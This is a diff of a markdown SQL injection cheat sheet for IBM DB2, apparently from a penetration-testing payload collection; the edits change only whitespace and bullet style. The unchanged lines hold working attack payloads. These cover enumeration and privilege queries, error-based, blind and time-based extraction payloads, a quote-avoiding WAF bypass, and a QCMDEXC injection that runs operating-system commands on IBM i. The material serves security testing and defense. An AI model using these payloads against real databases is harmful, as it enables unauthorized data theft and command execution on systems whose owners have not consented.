@@ -1,7 +1,6 @@
 # DB2 Injection
 
-> IBM DB2 is a family of relational database management systems (RDBMS) developed by IBM. Originally created in the 1980s for mainframes, DB2 has evolved to support various platforms and workloads, including distributed systems, cloud environments, and hybrid deployments. 
-
+> IBM DB2 is a family of relational database management systems (RDBMS) developed by IBM. Originally created in the 1980s for mainframes, DB2 has evolved to support various platforms and workloads, including distributed systems, cloud environments, and hybrid deployments.
 
 ## Summary
 
@@ -15,15 +14,13 @@
 * [DB2 Command Execution](#db2-command-execution)
 * [DB2 WAF Bypass](#db2-waf-bypass)
 * [DB2 Accounts and Privileges](#db2-accounts-and-privileges)
-* [References](#references) 
+* [References](#references)
 
-
-## DB2 Comments	
+## DB2 Comments
 
 | Type                       | Description                       |
 | -------------------------- | --------------------------------- |
 | `--`                       | SQL comment                       |
-
 
 ## DB2 Default Databases
 
@@ -35,7 +32,6 @@
 | SYSPUBLIC   | Metadata about objects available to all users (granted to PUBLIC).    |
 | SYSIBMADM   | Administrative views for monitoring and managing the database system. |
 | SYSTOOLs    | Tools, utilities, and auxiliary objects provided for database administration and troubleshooting. |
-
 
 ## DB2 Enumeration
 
@@ -52,7 +48,6 @@
 | Current database | `select current server from sysibm.sysdummy1` |
 | OS info          | `select os_name,os_version,os_release,host_name from sysibmadm.env_sys_info` |
 
-
 ## DB2 Methodology
 
 | Description      | SQL Query |
@@ -63,7 +58,6 @@
 | List tables      | `SELECT table_name FROM sysibm.tables` |
 | List tables      | `SELECT name FROM sysibm.systables` |
 | List tables      | `SELECT tbname FROM sysibm.syscolumns WHERE name='username'` |
-
 
 ## DB2 Error Based
 
@@ -79,7 +73,6 @@ select xmlagg(xmlrow(table_schema)) from (select distinct(table_schema) from sys
 select xml2clob(xmelement(name t, table_schema)) from sysibm.tables 
 ```
 
-
 ## DB2 Blind Based
 
 | Description      | SQL Query |
@@ -94,10 +87,9 @@ select xml2clob(xmelement(name t, table_schema)) from sysibm.tables
 | Bitwise XOR      | `select bitxor(1,0) from sysibm.sysdummy1` |
 | Bitwise NOT      | `select bitnot(1,0) from sysibm.sysdummy1` |
 
-
 ## DB2 Time Based
 
-Heavy queries, if user starts with ascii 68 ('D'), the heavy query will be executed, delaying the response. 
+Heavy queries, if user starts with ascii 68 ('D'), the heavy query will be executed, delaying the response.
 
 ```sql
 ' and (SELECT count(*) from sysibm.columns t1, sysibm.columns t2, sysibm.columns t3)>0 and (select ascii(substr(user,1,1)) from sysibm.sysdummy1)=68 
@@ -113,7 +105,6 @@ Using the `QSYS2.QCMDEXC()` on IBM i (previously named AS-400), it is possibile 
 '||QCMDEXC('QSH CMD(''system dspusrprf PROFILE'')')
 ```
 
-
 ## DB2 WAF Bypass
 
 ### Avoiding Quotes
@@ -121,7 +112,6 @@ Using the `QSYS2.QCMDEXC()` on IBM i (previously named AS-400), it is possibile 
 ```sql
 SELECT chr(65)||chr(68)||chr(82)||chr(73) FROM sysibm.sysdummy1
 ```
-
 
 ## DB2 Accounts and Privileges
 
@@ -137,9 +127,8 @@ SELECT chr(65)||chr(68)||chr(82)||chr(73) FROM sysibm.sysdummy1
 | List DBA accounts | `select name from SYSIBM.SYSUSERAUTH where SYSADMAUTH = 'Y' or SYSADMAUTH = 'G'` |
 | Location of DB files | `select * from sysibmadm.reg_variables where reg_var_name='DB2PATH'` |
 
-
 ## References
 
-- [DB2 SQL injection cheat sheet - Adrián - May 20, 2012](https://securityetalii.es/2012/05/20/db2-sql-injection-cheat-sheet/)
-- [Pentestmonkey's DB2 SQL Injection Cheat Sheet - @pentestmonkey - September 17, 2011](http://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet)
-- [QSYS2.QCMDEXC() - IBM Support - April 22, 2023](https://www.ibm.com/support/pages/qsys2qcmdexc)
+* [DB2 SQL injection cheat sheet - Adrián - May 20, 2012](https://securityetalii.es/2012/05/20/db2-sql-injection-cheat-sheet/)
+* [Pentestmonkey's DB2 SQL Injection Cheat Sheet - @pentestmonkey - September 17, 2011](http://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet)
+* [QSYS2.QCMDEXC() - IBM Support - April 22, 2023](https://www.ibm.com/support/pages/qsys2qcmdexc)
